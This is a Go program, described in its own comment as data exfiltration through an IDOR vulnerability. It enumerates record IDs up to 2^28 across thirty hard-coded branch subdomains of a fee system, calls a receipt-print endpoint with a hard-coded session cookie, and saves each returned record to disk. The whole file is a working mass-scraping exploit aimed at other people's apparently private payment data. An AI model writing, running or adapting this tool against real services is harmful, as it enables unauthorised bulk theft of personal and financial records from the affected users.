package main

// Data exfiltration through IDOR vulnerability

import (
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"path"
)

const max int = 1 << 28

var Endpoint string
var N int

type Work struct {
	Branch string
	Id     int
}

func Do(Jobs <-chan Work, Result chan<- error) {
	var DynObj map[string]interface{}
	for job := range Jobs {
		filepath := path.Join(job.Branch, fmt.Sprintf("%d.json", job.Id))
		if _, err := os.Stat(filepath); err == nil {
			Result <- fmt.Errorf("file `%s` already exists", filepath)
			continue
		}
		ro, err := http.NewRequest("GET", fmt.Sprintf("https://%s.%s/gw/fee/getReceiptPrintData?fl=%s", job.Branch, Endpoint, base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf("id=%d", job.Id)))), nil)
		if err != nil {
			Result <- err
			continue
		}
		ro.AddCookie(&http.Cookie{Name: "JSESSIONID", Value: "bMDrRYwaIE8fntbN1yTZNw"})
		r, err := new(http.Client).Do(ro)
		if err != nil {
			Result <- err
			continue
		}
		defer r.Body.Close()
		b, err := ioutil.ReadAll(r.Body)
		if err != nil {
			Result <- err
			continue
		}
		if err := json.Unmarshal(b, &DynObj); err != nil {
			Result <- err
			continue
		}
		if DynObj["d"] == nil {
			Result <- fmt.Errorf("%s, %d: JSONObject `d` is nil", job.Branch, job.Id)
			continue
		}
		Dump, err := json.Marshal(DynObj["d"])
		if err != nil {
			Result <- err
			continue
		}
		if err := ioutil.WriteFile(filepath, Dump, 0644); err != nil {
			Result <- err
			continue
		}
		Result <- nil
	}
}

func main() {
	branches := []string{"alcs", "asc", "ccs", "ccspp", "dpset", "dpsnt", "dpsrh", "dpsrhj", "gdgps", "gkk", "gmps", "idps", "iphs", "kpps", "mrvjp", "mrvms", "mrvps", "rkvvm", "sajp", "sapp", "sbdn", "sbfz", "sbg", "sbgh", "sps", "spsjh", "spsjr", "spskg", "spskt", "vsis"}
	flag.StringVar(&Endpoint, "u", "127.0.0.1", "Endpoint URI to exploit")
	flag.IntVar(&N, "t", 16, "Number of threads to use per branch")
	flag.Parse()
	if N < 1 {
		log.Fatalln("At least 1 worker thread is needed")
		return
	}
	Result, Jobs := make(chan error), make(chan Work, N)
	for _, B := range branches {
		os.Mkdir(B, 0755)
		go func() {
			for i := 0; i < max; i++ {
				Jobs <- Work{B, i}
			}
		}()
	}
	for i := 0; i < N; i++ {
		go Do(Jobs, Result)
	}
	for i := 0; i < max*len(branches); i++ {
		if err := <-Result; err != nil {
			log.Println(err)
		}
	}
	close(Jobs)
	close(Result)
}
